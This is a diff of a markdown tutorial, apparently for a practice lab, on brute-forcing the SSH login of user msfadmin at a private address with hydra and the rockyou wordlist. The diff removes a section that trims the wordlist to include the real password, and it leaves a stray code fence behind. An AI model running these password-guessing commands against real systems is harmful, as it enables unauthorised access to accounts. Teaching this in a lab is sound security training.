@@ -19,11 +19,6 @@ hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.112.133
 - `-P <wordlist>` → uppercase `-P` points to a password **list** to try against that username.
 - `ssh://192.168.112.133` → protocol and target.
 
-For a live demo, the full `rockyou.txt` (14+ million lines) is impractical against SSH specifically, since each attempt requires a full SSH handshake — far slower than something like a raw HTTP form. Trimming to a smaller list that includes the real password keeps the demo to a reasonable length:
-```bash
-grep -E "^(msfadmin|password|123456|admin|root|toor)$" /usr/share/wordlists/rockyou.txt > trimmed_pass.txt
-echo "msfadmin" >> trimmed_pass.txt   # ensure the real password is definitely in the list
-hydra -l msfadmin -P trimmed_pass.txt ssh://192.168.112.133
 ```
 
 ### Brute-forcing both username and password lists
